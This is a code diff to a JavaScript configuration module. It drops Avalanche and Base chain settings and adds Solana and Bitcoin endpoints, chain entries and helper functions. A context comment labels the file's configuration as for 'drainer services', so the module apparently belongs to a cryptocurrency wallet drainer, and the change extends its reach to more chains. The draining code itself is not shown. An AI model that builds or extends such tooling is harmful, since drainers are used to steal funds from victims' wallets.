@@ -200,10 +200,9 @@ export const BSC_RPC_URL = process.env.BSC_RPC_URL || '';
 export const POLYGON_RPC_URL = process.env.POLYGON_RPC_URL || '';
 export const ARBITRUM_RPC_URL = process.env.ARBITRUM_RPC_URL || '';
 export const OPTIMISM_RPC_URL = process.env.OPTIMISM_RPC_URL || '';
-export const AVALANCHE_RPC_URL = process.env.AVALANCHE_RPC_URL || '';
-export const BASE_RPC_URL = process.env.BASE_RPC_URL || '';
 export const ZKSYNC_RPC_URL = process.env.ZKSYNC_RPC_URL || '';
-
+export const SOLANA_RPC_URL = 'https://api.mainnet-beta.solana.com';
+export const BITCOIN_API_URL = 'https://blockstream.info/api';
 // ========== CONFIGURATION OBJECTS ==========
 
 // Modern drainer services configuration
@@ -350,22 +349,21 @@ export const CHAINS_CONFIG = {
     nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
     explorerApiKey: OPTIMISMSCAN_API_KEY
   },
-  avalanche: {
-    chainId: 43114,
-    name: 'Avalanche',
-    rpcUrl: AVALANCHE_RPC_URL,
-    explorer: 'https://snowtrace.io',
-    nativeCurrency: { name: 'AVAX', symbol: 'AVAX', decimals: 18 },
-    explorerApiKey: SNOWTRACE_API_KEY
-  },
-  base: {
-    chainId: 8453,
-    name: 'Base',
-    rpcUrl: BASE_RPC_URL,
-    explorer: 'https://basescan.org',
-    nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-    explorerApiKey: BASESCAN_API_KEY
-  }
+  solana: {
+  chainId: 'solana',
+  name: 'Solana',
+  rpcUrl: SOLANA_RPC_URL,
+  explorer: 'https://solscan.io',
+  nativeCurrency: { name: 'SOL', symbol: 'SOL', decimals: 9 }
+},
+bitcoin: {
+  chainId: 'bitcoin',
+  name: 'Bitcoin',
+  apiUrl: BITCOIN_API_URL,
+  explorer: 'https://blockstream.info',
+  nativeCurrency: { name: 'Bitcoin', symbol: 'BTC', decimals: 8 }
+}
+
 };
 
 // ========== VALIDATION FUNCTIONS ==========
@@ -420,16 +418,23 @@ export function getExplorerApiKey(chainId) {
 
 export function getRpcUrl(chainId) {
   const workingRpcUrls = {
-    1: 'https://eth.llamarpc.com',
-    56: 'https://bsc-dataseed.binance.org/',
-    137: 'https://polygon-rpc.com',
-    42161: 'https://arb1.arbitrum.io/rpc',
-    10: 'https://mainnet.optimism.io',
-    43114: 'https://api.avax.network/ext/bc/C/rpc',
-    8453: 'https://mainnet.base.org',
-    324: 'https://mainnet.era.zksync.io'
+    1: 'https://eth.llamarpc.com',           // Ethereum
+    56: 'https://bsc-dataseed.binance.org/', // BSC
+    137: 'https://polygon-rpc.com',          // Polygon
+    42161: 'https://arb1.arbitrum.io/rpc',   // Arbitrum
+    10: 'https://mainnet.optimism.io',       // Optimism
+    324: 'https://mainnet.era.zksync.io',    // zkSync
   };
   return workingRpcUrls[chainId] || 'https://eth.llamarpc.com';
+}
+
+// ADD THESE NEW FUNCTIONS:
+export function getSolanaRpcUrl() {
+  return 'https://api.mainnet-beta.solana.com';
+}
+
+export function getBitcoinApiUrl() {
+  return 'https://blockstream.info/api';
 }
 
 export const RPC_URLS = {
@@ -438,9 +443,9 @@ export const RPC_URLS = {
   bsc: BSC_RPC_URL,
   arbitrum: ARBITRUM_RPC_URL,
   optimism: OPTIMISM_RPC_URL,
-  avalanche: AVALANCHE_RPC_URL,
-  base: BASE_RPC_URL,
-  zksync: ZKSYNC_RPC_URL
+  zksync: ZKSYNC_RPC_URL,
+  solana: SOLANA_RPC_URL,
+  bitcoin: BITCOIN_API_URL
 };
 
 // Gasless configuration validation
